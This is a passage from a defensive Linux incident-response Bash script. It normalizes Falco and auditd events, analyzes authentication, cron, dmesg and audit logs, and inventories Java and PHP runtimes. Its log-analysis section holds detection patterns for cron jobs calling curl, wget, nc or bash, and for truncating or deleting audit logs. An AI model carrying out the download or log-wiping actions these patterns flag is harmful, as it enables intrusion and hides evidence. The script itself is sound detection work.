    [[ "$epoch" =~ ^[0-9]+([.][0-9]+)?$ ]] || epoch=$(date +%s)
    event_id="${supplied_event_id:-${source}:$(sha256_text "${epoch}|${action}|${pid}|${path}|${target}|${details}" | cut -c1-20)}"
    if [[ "$pid" =~ ^[0-9]+$ ]] && [ -r "/proc/${pid}/stat" ]; then
        process_instance=$(stable_linux_entity "pid=${pid}" "$exe")
    elif [[ "$pid" =~ ^[0-9]+$ ]]; then
        process_instance="process-unresolved:$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || echo unknown):${pid}:starttime-unavailable:${exe:-unknown}:${event_id}"
    fi
    if [[ "$ppid" =~ ^[0-9]+$ ]] && [ -r "/proc/${ppid}/stat" ]; then
        parent_instance=$(stable_linux_entity "pid=${ppid}" "parent")
    elif [[ "$ppid" =~ ^[0-9]+$ ]]; then
        parent_instance="process-unresolved:$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || echo unknown):${ppid}:starttime-unavailable:unknown:${event_id}"
    fi
    if [ -n "$path" ]; then file_entity=$(stable_linux_entity "$path" "$details"); fi
    if [ -n "$target" ]; then network_flow="network:${process_instance:-unknown}:$(sha256_text "$target")"; fi
    if [ -n "$process_instance" ]; then entity_type=PROCESS; entity_id="$process_instance"
    elif [ -n "$file_entity" ]; then entity_type=FILE; entity_id="$file_entity"
    elif [ -n "$network_flow" ]; then entity_type=NETWORK; entity_id="$network_flow"; fi
    printf '{"event_id":%s,"source":%s,"timestamp_utc":%s,"time_epoch":%s,"entity_type":%s,"entity_id":%s,"process_instance_id":%s,"parent_instance_id":%s,"file_entity_id":%s,"network_flow_id":%s,"site_id":"","request_id":"","evidence_domain":%s,"confidence":"OBSERVED","raw_reference":%s,"action":%s,"domain":%s,"pid":%s,"ppid":%s,"uid":%s,"exe":%s,"path":%s,"target":%s,"details":%s}\n' \
        "$(json_quote "$event_id")" "$(json_quote "$source")" "$(json_quote "$(date -u -d "@${epoch%.*}" +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || date -u +%Y-%m-%dT%H:%M:%SZ)")" "${epoch%.*}" \
        "$(json_quote "$entity_type")" "$(json_quote "$entity_id")" "$(json_quote "$process_instance")" "$(json_quote "$parent_instance")" \
        "$(json_quote "$file_entity")" "$(json_quote "$network_flow")" "$(json_quote "$domain")" "$(json_quote "${source}:raw")" \
        "$(json_quote "$action")" "$(json_quote "$domain")" \
        "$(json_quote "$pid")" "$(json_quote "$ppid")" "$(json_quote "$uid")" "$(json_quote "$exe")" \
        "$(json_quote "$path")" "$(json_quote "$target")" "$(json_quote "$(printf '%s' "$details" | head -c 1200)")" >> "$EVENT_CACHE_FILE"
    EVENT_COUNT=$((EVENT_COUNT + 1))
}

discover_falco_log() {
    local candidate
    for candidate in "$FALCO_LOG_PATH" /var/log/falco/events.json /var/log/falco/falco.json /var/log/falco.log; do
        [ -n "$candidate" ] && [ -r "$candidate" ] || continue
        printf '%s' "$candidate"; return 0
    done
    return 1
}

normalize_falco_events() {
    local log_file="$1" tmp line epoch domain action
    [ -r "$log_file" ] || return 1
    EVENT_SOURCE_FALCO="AVAILABLE"
    tmp="${OUTPUT_DIR}/.falco-normalized.$$"
    if command -v python3 >/dev/null 2>&1; then
        tail -n 20000 "$log_file" 2>/dev/null > "${RAW_DIR}/falco-structured.jsonl"
        chmod 600 "${RAW_DIR}/falco-structured.jsonl"; record_raw_status 'falco-structured.jsonl' SUCCESS falco ''
        tail -n 20000 "$log_file" 2>/dev/null | python3 -c '
import datetime,json,sys,time
start=int(sys.argv[1])
for line in sys.stdin:
    try:
        obj=json.loads(line); fields=obj.get("output_fields") or {}
        raw_time=obj.get("time") or obj.get("output_fields",{}).get("evt.time") or ""
        epoch=int(time.time())
        if isinstance(raw_time,(int,float)): epoch=int(raw_time)
        elif raw_time:
            try: epoch=int(datetime.datetime.fromisoformat(str(raw_time).replace("Z","+00:00")).timestamp())
            except Exception: pass
        if epoch < start: continue
        structured="tags="+json.dumps(obj.get("tags") or [],sort_keys=True)+" output_fields="+json.dumps(fields,sort_keys=True)+" output="+str(obj.get("output", ""))
        vals=[epoch,obj.get("rule",""),obj.get("priority",""),fields.get("proc.pid",""),fields.get("proc.ppid",""),fields.get("user.uid",""),fields.get("proc.exepath",fields.get("proc.name","")),fields.get("fd.name",fields.get("fs.path.name","")),fields.get("fd.rip",fields.get("fd.name","")),structured]
        print("\t".join(str(v).replace("\t"," ").replace("\n"," ") for v in vals))
    except Exception: continue
' "$EVENT_WINDOW_START_EPOCH" > "$tmp" 2>/dev/null || true
    else
        tail -n 5000 "$log_file" 2>/dev/null | grep -E 'memfd|ptrace|setns|unshare|connect|exec|open|write|rename|unlink|chmod|module|shell|web' > "$tmp" || true
    fi
    while IFS=$'\t' read -r epoch rule priority pid ppid uid exe path target details; do
        [ -n "$epoch$rule$details" ] || continue
        if [[ "$epoch" =~ ^[0-9]+$ ]]; then
            action=$(event_action_for_text "$rule $details"); domain=$(event_domain_for_text "$rule $details")
        else
            details="$epoch"; epoch=$(date +%s); action=$(event_action_for_text "$details"); domain=$(event_domain_for_text "$details")
        fi
        append_normalized_event "$epoch" falco "$action" "$domain" "$pid" "$ppid" "$uid" "$exe" "$path" "$target" "rule=$rule priority=$priority $details"
        EVENT_FALCO_COUNT=$((EVENT_FALCO_COUNT + 1))
    done < "$tmp"
    rm -f "$tmp"
    return 0
}

normalize_audit_events() {
    local source_file="$1" tmp epoch event_id pid ppid uid exe path target parse_status details action domain
    [ -r "$source_file" ] || return 1
    EVENT_SOURCE_AUDITD="AVAILABLE"
    tmp="${OUTPUT_DIR}/.audit-serial.$$"
    if command -v python3 >/dev/null 2>&1; then
        tail -n 50000 "$source_file" 2>/dev/null | python3 -c '
import collections,re,sys
start=int(sys.argv[1]); groups=collections.OrderedDict()
maps={
"c000003e":{59:"execve",42:"connect",2:"open",257:"openat",1:"write",82:"rename",87:"unlink",90:"chmod",101:"ptrace",272:"unshare",308:"setns",175:"init_module",313:"finit_module",311:"process_vm_writev"},
"40000003":{11:"execve",102:"socketcall",5:"open",295:"openat",4:"write",38:"rename",10:"unlink",15:"chmod",26:"ptrace",346:"setns",310:"unshare",128:"init_module",350:"finit_module",348:"process_vm_writev"},
"c00000b7":{221:"execve",203:"connect",56:"openat",64:"write",38:"renameat",35:"unlinkat",53:"fchmodat",117:"ptrace",97:"unshare",268:"setns",105:"init_module",273:"finit_module",271:"process_vm_writev"}}
for raw in sys.stdin:
    m=re.search(r"audit\(([0-9]+)(?:\.[0-9]+)?:([0-9]+)\)",raw)
    if not m or int(m.group(1))<start: continue
    serial=m.group(2); groups.setdefault(serial,[]).append(raw.rstrip())
for serial,lines in groups.items():
    joined=" || ".join(lines); fields={}; paths=[]; partial=False
    for line in lines:
        for key in ("pid","ppid","uid","auid","ses","arch","syscall"):
            m=re.search(r"(?:^| )"+key+r"=([^ ]+)",line)
            if m and key not in fields: fields[key]=m.group(1).strip(chr(34))
        for key in ("exe","proctitle"):
            m=re.search(r"(?:^| )"+key+r"=\"([^\"]*)\"",line)
            if m and key not in fields: fields[key]=m.group(1)
        m=re.search(r"(?:^| )name=\"([^\"]*)\"",line)
        if m: paths.append(m.group(1))
    syscall=fields.get("syscall",""); arch=fields.get("arch","").lower()
    if syscall.isdigit():
        name=maps.get(arch,{}).get(int(syscall))
        if name: joined="syscall_name="+name+" || "+joined
        else: partial=True; joined="syscall_unmapped="+arch+":"+syscall+" || "+joined
    elif syscall: joined="syscall_name="+syscall+" || "+joined
    target=""
    m=re.search(r"(?:daddr|addr)=([^ ]+)",joined)
    if m: target=m.group(1).strip(chr(34))
    vals=[m.group(1) if False else re.search(r"audit\(([0-9]+)",lines[0]).group(1),"audit:"+serial,
          fields.get("pid",""),fields.get("ppid",""),fields.get("auid",fields.get("uid","")),fields.get("exe",""),
          paths[-1] if paths else "",target,"PARTIAL" if partial else "COMPLETE",joined[:6000]]
    print("\x1f".join(str(v).replace("\x1f"," ").replace("\t"," ").replace("\n"," ") for v in vals))
' "$EVENT_WINDOW_START_EPOCH" > "$tmp" 2>/dev/null || { EVENT_SOURCE_AUDITD="PARTIAL"; : > "$tmp"; }
    else
        EVENT_SOURCE_AUDITD="PARTIAL"
        tail -n 50000 "$source_file" 2>/dev/null | grep -E 'type=(EXECVE|SYSCALL|PATH)|memfd|ptrace|process_vm_writev' | \
            awk '{printf "%s\037audit:unparsed:%s\037\037\037\037\037\037\037PARTIAL\037%s\n",systime(),NR,$0}' > "$tmp"
    fi
    while IFS=$'\x1f' read -r epoch event_id pid ppid uid exe path target parse_status details; do
        [ -n "$event_id" ] || continue
        action=$(event_action_for_text "$details"); domain=$(event_domain_for_text "$details $exe $path")
        append_normalized_event "$epoch" auditd "$action" "$domain" "$pid" "$ppid" "$uid" "$exe" "$path" "$target" "parse_status=$parse_status $details" "$event_id"
        EVENT_AUDIT_COUNT=$((EVENT_AUDIT_COUNT + 1))
    done < "$tmp"
    cp "$tmp" "${RAW_DIR}/audit-serial-events.tsv" 2>/dev/null || true
    chmod 600 "${RAW_DIR}/audit-serial-events.tsv" 2>/dev/null || true
    record_raw_status 'audit-serial-events.tsv' "$([ -s "$tmp" ] && printf SUCCESS || printf NO_RESULTS)" auditd "$([ "$EVENT_SOURCE_AUDITD" = PARTIAL ] && printf parser_fallback_or_failure || true)"
    rm -f "$tmp"
    return 0
}

collect_realtime_events() {
    local falco_file journal_tmp event_input native_output native_audit native_summary native_rc=0 native_status=FAILED
    local native_event_count native_falco_count native_audit_count
    EVENT_WINDOW_START_EPOCH=$(($(date +%s) - EVENT_WINDOW_MINUTES * 60))
    EVENT_CACHE_FILE="${RAW_DIR}/events-normalized.jsonl"
    EVENT_COUNT=0; EVENT_FALCO_COUNT=0; EVENT_AUDIT_COUNT=0
    : > "$EVENT_CACHE_FILE"
    falco_file=$(discover_falco_log 2>/dev/null || true)

    # Build one bounded input stream and let the native parser consume each
    # sampled line once. The legacy parsers remain a controlled fallback when
    # the native contract or its output cannot be validated.
    event_input="${RAW_DIR}/events-input.tsv"
    native_output="$EVENT_CACHE_FILE"
    native_audit="${RAW_DIR}/audit-serial-events.tsv"
    native_summary="${RAW_DIR}/events-native-summary.json"
    : > "$event_input"
    if [ -n "$falco_file" ] && [ -r "$falco_file" ]; then
        EVENT_SOURCE_FALCO="AVAILABLE"
        tail -n 20000 -- "$falco_file" 2>/dev/null | tee "${RAW_DIR}/falco-structured.jsonl" | sed 's/^/falco\t/' >> "$event_input" || native_rc=1
        chmod 600 "${RAW_DIR}/falco-structured.jsonl" 2>/dev/null || true
        record_raw_status 'falco-structured.jsonl' SUCCESS falco ''
    else
        EVENT_SOURCE_FALCO="MISSING"
    fi
    if [ -r "$AUDIT_LOG_PATH" ]; then
        EVENT_SOURCE_AUDITD="AVAILABLE"
        tail -n 50000 -- "$AUDIT_LOG_PATH" 2>/dev/null | sed 's/^/auditd\t/' >> "$event_input" || native_rc=1
    elif command -v journalctl >/dev/null 2>&1; then
        journal_tmp="${RAW_DIR}/journald-audit.log"
        journalctl --no-pager --since "${EVENT_WINDOW_MINUTES} minutes ago" _TRANSPORT=audit 2>/dev/null | tee "$journal_tmp" | sed 's/^/journald-audit\t/' >> "$event_input" || true
        if [ -s "$journal_tmp" ]; then EVENT_SOURCE_AUDITD="JOURNALD"; else EVENT_SOURCE_AUDITD="MISSING"; fi
        chmod 600 "$journal_tmp" 2>/dev/null || true
        record_raw_status 'journald-audit.log' "$([ -s "$journal_tmp" ] && printf SUCCESS || printf NO_RESULTS)" auditd ''
    else
        EVENT_SOURCE_AUDITD="MISSING"
    fi
    if [ -n "${SYSLOG:-}" ] && [ -r "$SYSLOG" ]; then
        tail -n 20000 -- "$SYSLOG" 2>/dev/null | sed 's/^/system-log\t/' >> "$event_input" || native_rc=1
    fi
    chmod 600 "$event_input" 2>/dev/null || true
    record_raw_status 'events-input.tsv' "$([ -s "$event_input" ] && printf SUCCESS || printf NO_RESULTS)" logs ''
    if [ "$native_rc" -eq 0 ] && [ -x "$NATIVE_SCANNER_PATH" ]; then
        # The lookback duration controls event selection, not parser runtime.
        # A 24-hour Full window must not create a 1530-second parser timeout.
        local event_parse_timeout="$FILE_TIMEOUT_SECONDS"
        [ "$event_parse_timeout" -le 300 ] || event_parse_timeout=300
        [ "$event_parse_timeout" -ge 30 ] || event_parse_timeout=30
        run_with_timeout "$event_parse_timeout" "$NATIVE_SCANNER_PATH" parse-events --input "$event_input" \
            --output "$native_output" --audit-output "$native_audit" --start-epoch "$EVENT_WINDOW_START_EPOCH" \
            --max-lines 120000 > "$native_summary" 2>&1 || native_rc=$?
        if [ "$native_rc" -eq 0 ] && grep -Eq '"status"[[:space:]]*:[[:space:]]*"(SUCCESS|PARTIAL)"' "$native_summary" && [ -s "$native_output" ]; then
            grep -Eq '"status"[[:space:]]*:[[:space:]]*"PARTIAL"' "$native_summary" && native_status=PARTIAL || native_status=SUCCESS
            native_event_count=$(sed -n 's/.*"events"[[:space:]]*:[[:space:]]*\([0-9][0-9]*\).*/\1/p' "$native_summary" | tail -1)
            native_falco_count=$(sed -n 's/.*"falco"[[:space:]]*:[[:space:]]*\([0-9][0-9]*\).*/\1/p' "$native_summary" | tail -1)
            native_audit_count=$(sed -n 's/.*"audit"[[:space:]]*:[[:space:]]*\([0-9][0-9]*\).*/\1/p' "$native_summary" | tail -1)
            EVENT_COUNT=${native_event_count:-$(grep -c '"record_type":"event"' "$native_output" 2>/dev/null || true)}
            EVENT_FALCO_COUNT=${native_falco_count:-$(grep -c '"source":"falco"' "$native_output" 2>/dev/null || true)}
            EVENT_AUDIT_COUNT=${native_audit_count:-$(grep -Ec '"source":"(auditd|journald-audit)"' "$native_output" 2>/dev/null || true)}
            chmod 600 "$native_output" "$native_audit" "$native_summary" 2>/dev/null || true
            record_raw_status 'events-normalized.jsonl' "$native_status" logs "native_events_parser=${native_status}"
            record_raw_status 'audit-serial-events.tsv' "$([ -s "$native_audit" ] && printf SUCCESS || printf NO_RESULTS)" auditd ''
            record_raw_status 'events-native-summary.json' "$native_status" logs "native_events_parser=${native_status}"
            [ "$native_status" = SUCCESS ] || mark_current_module_partial native_events_parser_partial
            if [ "$STATE_ENABLED" = true ] && [ -d "$STATE_DIR" ]; then
                EVENT_CACHE_STATE_FILE="${STATE_DIR}/events-recent.jsonl"
                cp "$EVENT_CACHE_FILE" "${EVENT_CACHE_STATE_FILE}.tmp.$$" 2>/dev/null && mv "${EVENT_CACHE_STATE_FILE}.tmp.$$" "$EVENT_CACHE_STATE_FILE" && chmod 600 "$EVENT_CACHE_STATE_FILE" || mark_current_module_partial event_cache_state_failed
            fi
            [ "$EVENT_SOURCE_FALCO" != MISSING ] || [ "$EVENT_SOURCE_AUDITD" != MISSING ] || mark_current_module_partial realtime_events_unavailable
            return 0
        fi
        mark_current_module_partial "native_events_parser_exit_${native_rc}"
    fi

    # Controlled compatibility fallback. It is only reached when the native
    # parser is unavailable or its contract fails; the raw sampled input stays
    # available for audit and does not get discarded.
    : > "$EVENT_CACHE_FILE"
    [ -z "$falco_file" ] || normalize_falco_events "$falco_file" || EVENT_SOURCE_FALCO="PARTIAL"
    if [ -r "$AUDIT_LOG_PATH" ]; then
        normalize_audit_events "$AUDIT_LOG_PATH" || EVENT_SOURCE_AUDITD="PARTIAL"
    elif command -v journalctl >/dev/null 2>&1; then
        journal_tmp="${OUTPUT_DIR}/.audit-journal.$$"
        journalctl --no-pager --since "${EVENT_WINDOW_MINUTES} minutes ago" _TRANSPORT=audit 2>/dev/null > "$journal_tmp" || true
        if [ -s "$journal_tmp" ]; then
            EVENT_SOURCE_AUDITD="JOURNALD"
            while IFS= read -r line; do
                append_normalized_event "$(date +%s)" journald-audit "$(event_action_for_text "$line")" "$(event_domain_for_text "$line")" "" "" "" "" "" "" "$line"
                EVENT_AUDIT_COUNT=$((EVENT_AUDIT_COUNT + 1))
            done < "$journal_tmp"
        fi
        rm -f "$journal_tmp"
    fi
    [ -r /sys/kernel/security/ima/ascii_runtime_measurements ] && EVENT_SOURCE_IMA="AVAILABLE"
    record_raw_status 'events-normalized.jsonl' "$([ "$EVENT_COUNT" -gt 0 ] && printf SUCCESS || printf NO_RESULTS)" logs ""
    if [ "$STATE_ENABLED" = true ] && [ -d "$STATE_DIR" ]; then
        EVENT_CACHE_STATE_FILE="${STATE_DIR}/events-recent.jsonl"
        cp "$EVENT_CACHE_FILE" "${EVENT_CACHE_STATE_FILE}.tmp.$$" 2>/dev/null && mv "${EVENT_CACHE_STATE_FILE}.tmp.$$" "$EVENT_CACHE_STATE_FILE" && chmod 600 "$EVENT_CACHE_STATE_FILE" || mark_current_module_partial event_cache_state_failed
    fi
    [ "$EVENT_SOURCE_FALCO" != MISSING ] || [ "$EVENT_SOURCE_AUDITD" != MISSING ] || mark_current_module_partial realtime_events_unavailable
}

#==============================================================================
# 10 — 日志分析
#==============================================================================

check_logs() {
    echo ""
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BOLD}${MAGENTA}  [10/12] 日志分析${NC}"
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

    local auth_log="${AUTH_LOG}"
    local syslog="${SYSLOG}"
    collect_realtime_events
    AUTH_EVENTS=$(read_auth_events)
    analyze_ssh_auth_behavior

    # 1. SSH 爆破检测 — 大量 Failed password
    echo -e "\n  ${BOLD}[1] SSH 暴力破解 — Top 15 来源 IP:${NC}"
    if [ -n "$AUTH_EVENTS" ]; then
        while read -r count ip; do
            local marker=""
            [ "$count" -gt 100 ] && marker=" ${RED}← 爆破${NC}"
            echo "    ${count}  $ip$marker"
            if [ "$count" -gt 100 ]; then
                add_ioc "IP" "$ip" "SSH 爆破 (${count}次)"
            fi
        done < <(printf '%s\n' "$AUTH_EVENTS" | grep 'Failed password' | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -15)

        # 成功登录后的异常
        echo -e "\n  ${BOLD}[2] 最近成功登录 (Accepted):${NC}"
        printf '%s\n' "$AUTH_EVENTS" | grep 'Accepted' | tail -20 | while read line; do echo "    $line"; done

        # sudo 提权记录
        echo -e "\n  ${BOLD}[3] 最近 sudo 操作:${NC}"
        printf '%s\n' "$AUTH_EVENTS" | grep 'sudo:' | tail -20 | while read line; do echo "    $line"; done

        # 异常时段、来源和认证方式由认证画像引擎按独立事件去重分析。
    else
        mark_current_module_partial "auth_events_unavailable"
        log_warn "未能从 $auth_log 或 systemd journal 读取 SSH 认证日志"
    fi

    # 4. Cron 日志 — 可疑下载/执行
    echo -e "\n  ${BOLD}[4] Cron 执行日志 — 可疑记录:${NC}"
    if [ -f "$syslog" ]; then
        grep -i 'CRON' "$syslog" 2>/dev/null | grep -iE 'curl|wget|bash|sh |nc |python|chmod' | tail -20 | while read line; do echo "    $line"; done
    fi

    # 5. 审计日志清除
    echo -e "\n  ${BOLD}[5] 审计日志清除痕迹:${NC}"
    local log_clear_evidence
    log_clear_evidence=$(grep -iE 'audit.*(cleared|truncat)|wevtutil|truncate.*(/var/log|audit[.]log)|rm .*(/var/log|audit[.]log)|remov.*security.*log|delet.*audit.*log' "$syslog" "$auth_log" 2>/dev/null | tail -10)
    if [ -n "$log_clear_evidence" ]; then
        printf '%s\n' "$log_clear_evidence" | while read -r line; do echo "    $line"; done
        record_find CRITICAL logs '关键安全/审计日志出现明确清除行为' "$log_clear_evidence" '立即保全集中日志、journal/audit 记录和操作者上下文' 'T1070.001' 'LOG-SECURITY-CLEAR' 'security-log-clear' 'auth_log_excerpt.txt,dmesg_tail.txt,events-normalized.jsonl' 'SECURITY_THREAT' HIGH '明确的安全日志清除属于直接高可信防御规避行为' '核对授权取证/维护记录；非授权场景按主机失陷响应' 'DEFENSE_EVASION,INTEGRITY'
    fi

    # 6. dmesg — 内核消息中的异常
    echo -e "\n  ${BOLD}[6] dmesg 异常内核消息 (OOM Killer / segfault / module):${NC}"
    dmesg 2>/dev/null | grep -iE 'Oops|segfault|BUG:|tainted|module.*load|Out of memory|Killed process' | tail -15 | while read line; do echo "    $line"; done

    # 检查 module taint
    local tainted=$(dmesg 2>/dev/null | grep -i taint | tail -5)
    if [ -n "$tainted" ]; then
        emit_find "OBSERVE" "内核模块被标记为 tainted" \
            "$tainted" \
            "检查 /proc/sys/kernel/tainted 值和加载的模块"
        record_find "OBSERVE" "kernel" "Kernel tainted" "$tainted" "检查模块签名、路径和包归属" "" \
            "INT-KERNEL-TAINT" "kernel-taint" "dmesg_tail.txt,kernel_tainted.txt,lsmod.txt,proc_modules.txt" \
            "SECURITY_ANOMALY" "LOW" '专有驱动、崩溃或强制卸载等正常运维场景也会设置 taint 标记' \
            '若同时发现未知模块、隐藏进程、内核符号篡改或无包归属模块，应升级处置'
    fi

    # 7. lastb 失败登录
    echo -e "\n  ${BOLD}[7] 失败登录记录 (lastb):${NC}"
    lastb 2>/dev/null | head -20 | while read line; do echo "    $line"; done

    # ---- 原始数据 ----
    [ -n "$AUTH_EVENTS" ] && { printf '%s\n' "$AUTH_EVENTS" | grep -E 'Failed password|Accepted|sudo:|new user' | tail -300 | dump_raw "auth_log_excerpt.txt"; }
    dump_raw "last_logins.txt" last -n 50
    dump_raw "lastb_logins.txt" lastb -n 50
    dump_raw "dmesg_tail.txt" bash -o pipefail -c 'dmesg 2>/dev/null | tail -500'
    if [ -r /var/log/audit/audit.log ]; then
        tail -n 20000 /var/log/audit/audit.log 2>/dev/null | \
            grep -E 'type=(USER_AUTH|USER_LOGIN|USER_START|USER_CMD|EXECVE|SYSCALL)' | tail -n 2000 | \
            dump_raw "audit_auth_exec_events.txt"
    elif command -v journalctl >/dev/null 2>&1; then
        journalctl --no-pager -n 5000 _TRANSPORT=audit 2>/dev/null | \
            grep -E 'USER_AUTH|USER_LOGIN|USER_START|USER_CMD|EXECVE|SYSCALL' | tail -n 2000 | \
            dump_raw "audit_auth_exec_events.txt"
    fi

    log_info "日志分析完成"
}

#==============================================================================
# 11 — 内存取证（轻量）
#==============================================================================

collect_jvm_runtime_inventory() {
    local out="${RAW_DIR}/jvm-runtime.tsv" status pid start user exe cmd cwd tmp jcmd_path rc java_version server_type
    declare -A java_version_cache=()
    printf 'process_instance_id\tpid\tstarttime_ticks\tuser\tjava_path\tjava_version\tserver_type\tcwd\tclasspath\tagents\tcontainer_or_service\tjcmd_status\tcommand_line\n' > "$out"
    for status in /proc/[0-9]*/status; do
        [ -r "$status" ] || continue; pid="${status#/proc/}"; pid="${pid%/status}"
        exe=$(readlink -f "/proc/${pid}/exe" 2>/dev/null || true); cmd=$(tr '\0' ' ' < "/proc/${pid}/cmdline" 2>/dev/null | head -c 4000)
        case "$(basename "$exe") $cmd" in java*|*/java\ *) ;; *) continue ;; esac
        start=$(awk '{print $22}' "/proc/${pid}/stat" 2>/dev/null); [ -n "$start" ] || continue
        user=$(awk '/^Uid:/ {print $2;exit}' "$status" 2>/dev/null); cwd=$(readlink -f "/proc/${pid}/cwd" 2>/dev/null || true)
        java_version="${java_version_cache[$exe]:-}"
        if [ -z "$java_version" ]; then java_version=$(run_with_timeout 4 "$exe" -version 2>&1 | head -1 | tr '\t' ' '); java_version_cache[$exe]="${java_version:-UNAVAILABLE}"; fi
        server_type=generic-jvm; case "$cmd" in *[Tt]omcat*|*catalina*) server_type=tomcat ;; *[Jj]etty*) server_type=jetty ;; *[Uu]ndertow*) server_type=undertow ;; *spring-boot*|*SpringApplication*) server_type=spring-boot ;; esac
        jcmd_path=$(dirname "$exe")/jcmd; rc=127; tmp="${OUTPUT_DIR}/.jcmd.${pid}.$$"
        if [ -x "$jcmd_path" ]; then run_with_timeout 6 "$jcmd_path" "$pid" VM.command_line > "$tmp" 2>&1; rc=$?; fi
        printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
            "process:$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || echo unknown):${pid}:${start}:${exe}" "$pid" "$start" "$user" "$exe" "${java_version:-UNAVAILABLE}" "$server_type" "$cwd" \
            "$(printf '%s' "$cmd" | sed -nE 's/.*(-cp|-classpath)[[:space:]]+([^[:space:]]+).*/\2/p')" \
            "$(printf '%s' "$cmd" | grep -Eo -- '-javaagent:[^ ]+|-agentlib:[^ ]+|-agentpath:[^ ]+' | tr '\n' ',')" \
            "$(tr '\n' ';' < "/proc/${pid}/cgroup" 2>/dev/null | head -c 500)" "$([ "$rc" -eq 0 ] && printf SUCCESS || printf "UNAVAILABLE_OR_EXIT_%s" "$rc")" \
            "$(printf '%s' "$cmd" | tr '\t\n' '  ')" >> "$out"
        [ "$rc" -ne 0 ] || { mkdir -p "${RAW_DIR}/jvm"; chmod 700 "${RAW_DIR}/jvm"; mv "$tmp" "${RAW_DIR}/jvm/${pid}-vm-command-line.txt"; chmod 600 "${RAW_DIR}/jvm/${pid}-vm-command-line.txt"; }
        rm -f "$tmp"
    done
    record_raw_status 'jvm-runtime.tsv' "$([ "$(wc -l < "$out")" -gt 1 ] && printf SUCCESS || printf NO_RESULTS)" runtime ''
    if [ "${SECSCOPE_JAVA_DEEP_MODE:-false}" = true ]; then
        if [ -r "${PROGRAM_DIR}/helpers/java/SecScopeRuntimeInspector.java" ]; then
            printf '{"status":"CONFIGURATION_REQUIRED","mode":"deep","note":"source is present; build and add -javaagent explicitly during an authorized maintenance window; SecScope never auto-attaches"}\n' > "${RAW_DIR}/jvm-deep-visibility.json"
            record_raw_status 'jvm-deep-visibility.json' PARTIAL runtime 'deep agent must be explicitly built and configured at JVM startup'
        else
            record_raw_status 'jvm-deep-visibility.json' UNAVAILABLE runtime 'deep helper source missing'
        fi
    else
        printf '{"status":"DISABLED","mode":"deep","reason":"SECSCOPE_JAVA_DEEP_MODE is false by default"}\n' > "${RAW_DIR}/jvm-deep-visibility.json"
        record_raw_status 'jvm-deep-visibility.json' UNAVAILABLE runtime 'explicit deep mode disabled'
    fi
}

collect_php_runtime_inventory() {
    local out="${RAW_DIR}/php-runtime.tsv" config key value file clean_file hash owner status pid start exe mapping extension_dir
    local proc_root="${SECSCOPE_PROC_ROOT:-/proc}" boot_id mapping_key cached
    declare -A php_runtime_mapping_seen=() php_runtime_hash_cache=() php_runtime_owner_cache=()
    boot_id=$(cat "${proc_root}/sys/kernel/random/boot_id" 2>/dev/null || echo unknown)
    [ "$PKG_MGR" != dpkg ] || prepare_package_owner_index
    printf 'kind\tprocess_instance_or_config\tkey\tvalue_or_hash\tpackage_owner\tassessment\n' > "$out"
    for config in /etc/php.ini /etc/php/*/fpm/php.ini /etc/php/*/cli/php.ini /etc/php-fpm.conf /etc/php-fpm.d/*.conf /etc/php/*/fpm/pool.d/*.conf /usr/local/etc/php/php.ini /usr/local/etc/php-fpm.d/*.conf; do
        [ -r "$config" ] && [ ! -L "$config" ] || continue
        extension_dir=""
        while IFS='=' read -r key value; do
            key=$(printf '%s' "$key" | tr -d '[:space:]'); value=$(printf '%s' "$value" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            case "$key" in auto_prepend_file|auto_append_file|opcache.preload|extension|zend_extension|extension_dir|chroot|chdir|php_admin_value*)
                printf 'config\t%s\t%s\t%s\t%s\tREVIEW\n' "$config" "$key" "$value" "$(file_package_owner "$config")" >> "$out"
                [ "$key" != extension_dir ] || extension_dir=$(printf '%s' "$value" | tr -d '"' | tr -d "'")
                file=$(printf '%s' "$value" | tr -d '"' | tr -d "'"); hash=""; owner=""
                case "$key" in extension|zend_extension) [[ "$file" = /* ]] || [ -z "$extension_dir" ] || file="${extension_dir%/}/$file" ;; esac
                case "$key" in extension|zend_extension|auto_prepend_file|auto_append_file|opcache.preload)
                    if [ -f "$file" ] && [ ! -L "$file" ]; then hash=$(sha256_file "$file" 2>/dev/null || true); owner=$(file_package_owner "$file"); printf 'configured_file\t%s\t%s\t%s sha256=%s\t%s\t%s\n' "$config" "$key" "$file" "$hash" "${owner:-unowned}" "$([ -n "$owner" ] && printf OBSERVED || printf REVIEW)" >> "$out"; fi ;;
                esac ;;
            esac
        done < <(grep -Eh '^[[:space:]]*(auto_prepend_file|auto_append_file|opcache[.]preload|extension|zend_extension|extension_dir|chroot|chdir|php_admin_value)[[:space:]]*=' "$config" 2>/dev/null)
    done
    for status in "${proc_root}"/[0-9]*/status; do
        pid="${status#${proc_root}/}"; pid="${pid%/status}"; [ -r "$status" ] || continue
        case "$(cat "${proc_root}/${pid}/comm" 2>/dev/null)" in php-fpm|php-fpm*) ;; *) continue ;; esac
        start=$(awk '{print $22}' "${proc_root}/${pid}/stat" 2>/dev/null); exe=$(readlink -f "${proc_root}/${pid}/exe" 2>/dev/null || true)
        while IFS= read -r mapping; do
            file=$(printf '%s' "$mapping" | awk '{print $NF}'); hash=""; owner=""
            clean_file="${file% (deleted)}"; mapping_key="${pid}|${file}"
            [ -z "${php_runtime_mapping_seen[$mapping_key]+present}" ] || continue
            php_runtime_mapping_seen["$mapping_key"]=1
            if [ -f "$clean_file" ]; then
                if [ -n "${php_runtime_hash_cache[$clean_file]+present}" ]; then
                    cached="${php_runtime_hash_cache[$clean_file]}"; [ "$cached" = __UNAVAILABLE__ ] || hash="$cached"
                else
                    hash=$(sha256_file "$clean_file" 2>/dev/null || true)
                    php_runtime_hash_cache["$clean_file"]="${hash:-__UNAVAILABLE__}"
                fi
                if [ -n "${php_runtime_owner_cache[$clean_file]+present}" ]; then
                    cached="${php_runtime_owner_cache[$clean_file]}"; [ "$cached" = __UNOWNED__ ] || owner="$cached"
                else
                    owner=$(file_package_owner "$clean_file")
